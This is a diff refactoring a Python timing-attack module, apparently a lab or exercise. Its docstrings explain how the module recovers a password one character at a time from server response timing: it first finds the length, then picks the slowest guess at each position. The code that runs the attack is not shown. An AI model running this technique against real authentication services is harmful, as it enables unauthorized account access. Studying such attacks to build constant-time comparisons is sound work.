@@ -1,75 +1,63 @@
 """
-Main timing attack orchestrator.
-
-Implements IAttackStrategy interface using timing side-channel technique.
-
-Author: Your Name
-Date: 2025
+Attack Orchestrator: Two-phase timing attack implementation.
+Consolidates timing_attacker.py.
 """
 
 from typing import Dict, List
 from dataclasses import dataclass
 
-from core.interfaces import (
-    IAttackStrategy, IHttpClient, ITimingAnalyzer,
-    TimingMeasurement, CharacterAnalysis
-)
-from core.exceptions import AttackFailedException
-from services.timing_service import TimingService, SamplingStrategy
-from utils.logger import Logger
+from http_client import HttpClient, TimingMeasurement
+from timing import TimingService, AnalysisService, CharacterAnalysis
+from utils import Logger, AttackFailedException
 
+
+# ============================================
+# CONFIGURATION
+# ============================================
 
 @dataclass
 class AttackConfig:
     """Configuration for the timing attack."""
     charset: str = "abcdefghijklmnopqrstuvwxyz"
     max_length: int = 32
-    verify_each_char: bool = True  # Verify after each character
+    verify_each_char: bool = True
 
 
-class TimingAttacker(IAttackStrategy):
+# ============================================
+# TIMING ATTACKER
+# ============================================
+
+class TimingAttacker:
     """
     Character-by-character timing attack implementation.
 
+    Two-phase approach:
+    1. Phase 1: Discover password length using timing analysis
+    2. Phase 2: Discover each character using known length with padding
+
     Algorithm:
-    1. Start with empty password
-    2. For each position:
-        a. Try all possible characters
-        b. Measure timing for each
-        c. Select character with longest time
-        d. Verify selection (optional)
-    3. Repeat until complete password found
+    - Start with empty password
+    - For each position:
+      a. Try all possible characters (padded to known length)
+      b. Measure timing for each
+      c. Select character with longest time
+      d. Verify selection (optional)
+    - Repeat until complete password found
 
     Why this works:
     - Naive comparison stops at first mismatch
     - Correct characters proceed to next position
     - Extra comparison = measurable time difference
-
-    Example:
-        >>> config = AttackConfig(charset="abc", max_length=3)
-        >>> attacker = TimingAttacker(http_client, analyzer, timing_service, config)
-        >>> password = attacker.crack_password("user123", difficulty=1, max_length=32)
-        >>> print(f"Recovered: {password}")
     """
 
     def __init__(
         self,
-        http_client: IHttpClient,
-        timing_analyzer: ITimingAnalyzer,
+        http_client: HttpClient,
+        timing_analyzer: AnalysisService,
         timing_service: TimingService,
         config: AttackConfig,
         logger: Logger
     ):
-        """
-        Initialize timing attacker.
-
-        Args:
-            http_client: HTTP client for server communication
-            timing_analyzer: Statistical analyzer for timing data
-            timing_service: Service for collecting timing measurements
-            config: Attack configuration
-            logger: Logger instance
-        """
         self.http_client = http_client
         self.timing_analyzer = timing_analyzer
         self.timing_service = timing_service
@@ -142,7 +130,7 @@ class TimingAttacker(IAttackStrategy):
         """
         Discover the password length using timing analysis.
 
-        Strategy: Test different length prefixes filled with random chars.
+        Strategy: Test different length prefixes filled with the same char.
         The correct length will show a timing spike because the comparison
         continues beyond the length check.
 
